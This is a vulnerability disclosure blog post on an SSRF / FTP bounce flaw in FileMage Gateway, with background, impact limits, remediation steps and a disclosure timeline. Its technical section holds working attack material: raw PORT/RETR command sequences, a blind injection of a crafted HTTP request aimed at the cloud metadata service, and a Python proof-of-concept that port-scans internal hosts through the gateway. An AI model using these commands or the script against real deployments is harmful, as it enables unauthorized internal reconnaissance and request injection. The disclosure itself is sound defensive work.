---
layout: post
title:  "FileMage Gateway - SSRF via FTP Bounce (Unvalidated PORT Command)"
date:   2026-10-07 12:00:00 -0400
categories: TechnicalBlog
---
### Overview

On a recent assessment I identified a Server-Side Request Forgery (SSRF) vulnerability in the FTP service of FileMage Gateway. Any **authenticated** FTP user - even a read-only, folder-confined account - can make the gateway open TCP connections to arbitrary internal hosts and ports. This is the classic **FTP "bounce"** condition: the server fails to validate that the IP address supplied in the FTP `PORT` command matches the client's control-connection address (the mitigation recommended in RFC 2577 since 1999).

The issue has been reported to FileMage and a CVE ID has been requested through the MITRE CNA-LR.

- **Product:** FileMage Gateway
- **Affected:** confirmed on 1.15.10 (earlier versions likely; vendor to confirm)
- **Severity:** Medium - CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N` (6.3)
- **Class:** CWE-918 (SSRF), CWE-201 (FTP bounce)
- **CVE:** CVE-2026-XXXXX (reserved / pending)

### What is FileMage

FileMage Gateway is an FTP/SFTP server backed by a cloud object-storage API (S3, Azure Blob, GCS), deployable from the cloud marketplaces and billed hourly. It ships its own protocol stacks in a single Go binary - the FTP server is FileMage's own implementation, not a wrapped `vsftpd`/`proftpd`.

### Background: FTP active mode and the bounce attack

In FTP *active mode*, the client issues `PORT a,b,c,d,p1,p2` to tell the server which `IP:port` to open the data connection to (the target port is `p1*256 + p2`). RFC 959 (1985) never constrained that IP, which is the basis of the **FTP bounce attack**, public since ~1995 (CERT CA-97.27). Since 1999, **RFC 2577** and essentially every mainstream FTP server mitigate it by **refusing any `PORT` whose IP differs from the control-connection's source IP**. FileMage's FTP server performs no such check.

### Technical details

Authenticate as any FTP user, then point `PORT` at an address that is not yours and issue a transfer command. The gateway connects there:

```
$ nc <host> 21
220 FTP Server [<your-ip>:<port>]
USER <ftp-user>
PASS <password>
TYPE I
PORT 127,0,0,1,21,56        # 127.0.0.1:5432  (p1*256+p2)
200 PORT command successful
LIST
150 Using transfer connection      # the gateway connected to its own localhost:5432
```

The `PORT` IP (`127.0.0.1`) is obviously not the client's address, yet it is accepted.

#### (A) Internal port scan

Using one session per probe, the control-channel response is a clean open/closed/filtered oracle:

| Target (from the gateway's position) | `LIST` response | Verdict |
|---|---|---|
| `127.0.0.1:5432`, `127.0.0.1:8443` | `150 Using transfer connection` (instant) | open |
| `127.0.0.1:1` | `550 Internal error` (instant) | closed |
| `10.255.255.1:80` | timeout (~14s) | filtered |
| `169.254.169.254:80` (cloud metadata) | `150 Using transfer connection` | reachable |

A low-privilege FTP user has no legitimate reason to reach any of these - they are the gateway's own loopback services and VPC-internal hosts, not Internet-exposed.

#### (B) Blind data injection

`RETR`-bounce pushes the *contents* of an uploaded object to the chosen `host:port`. Upload a file whose bytes are an arbitrary payload, then:

```
PORT 127,0,0,1,35,139       # 127.0.0.1:9099
RETR payload.txt
150 Using transfer connection
```

Running a listener on the target confirms the gateway delivers the attacker-controlled bytes verbatim:

```
$ nc -l 127.0.0.1 9099
GET /latest/meta-data/ HTTP/1.0
Host: 169.254.169.254
```

So the gateway can be coerced into sending arbitrary bytes to arbitrary internal services (HTTP APIs, Redis, etc.).

#### Proof-of-concept script

```python
#!/usr/bin/env python3
# FileMage FTP bounce / SSRF PoC - authorized testing only.
import socket, time, sys
HOST="<host>"; USER="<ftp-user>"; PASS="<password>"
def pb(ip, port):
    a=ip.split("."); return f"PORT {a[0]},{a[1]},{a[2]},{a[3]},{port>>8},{port&0xff}"
def sess():
    s=socket.create_connection((HOST,21),15); s.recv(300)
    def c(cmd,to=12):
        s.settimeout(to); s.sendall((cmd+"\r\n").encode())
        try: return s.recv(400).decode(errors="replace").strip()
        except socket.timeout: return "<TIMEOUT>"
    c(f"USER {USER}");
    if not c(f"PASS {PASS}").startswith("230"): sys.exit("login failed")
    c("TYPE I"); return s,c
for ip,port,label in [("127.0.0.1",5432,"postgres"),("127.0.0.1",8443,"mgmt"),
                      ("127.0.0.1",1,"closed"),("169.254.169.254",80,"imds"),
                      ("10.255.255.1",80,"filtered")]:
    s,c=sess(); c(pb(ip,port)); t=time.time(); r=c("LIST",14); dt=time.time()-t
    v="OPEN" if r.startswith("150") else "CLOSED" if r.startswith("5") else "FILTERED" if r=="<TIMEOUT>" else r
    print(f"{ip}:{port:<6} [{label}] -> {v} ({dt:.1f}s)"); s.close()
```

### Impact

An untrusted FTP user - whose intended capability is only to read/write their own files in object storage - can instead reach the gateway's internal network: enumerate internal services and blindly send requests to them.

**Honest limitations.** The primitive is **blind** (responses return on the FTP data channel, not to the attacker), so it is not a general internal-read primitive. On the instance I tested, **IMDSv2 was enforced**, so instance-role credentials could **not** be stolen via a blind bounced request (minting an IMDSv2 token requires reading the token out of the response). Impact is therefore internal reconnaissance plus blind write/SSRF, and it is higher on deployments running IMDSv1 or exposing sensitive internal services. Exploitation requires a valid account - pre-authentication and anonymous logins are rejected, and administrators cannot use FTP.

### Remediation

- Reject any `PORT`/`EPRT` whose target IP differs from the control-connection's source IP (the RFC 2577 mitigation; the same fix applied for the analogous **CVE-2020-15152** in the `ftp-srv` project).
- Optionally refuse `PORT` targets to privileged ports (<1024); prefer/force passive mode, or disable active mode.
- Operators: restrict FTP and data ports at the network layer, disable plaintext FTP / require FTPS, and keep IMDSv2 enforced.

### Disclosure timeline

- **2026-10-07** - Reported to FileMage; CVE ID requested (MITRE CNA-LR).

### References

- RFC 2577 - FTP Security Considerations
- CVE-2020-15152 - SSRF via unvalidated active-mode `PORT` command in `ftp-srv`
- CVE-1999-0017 / CERT CA-97.27 - FTP bounce attack
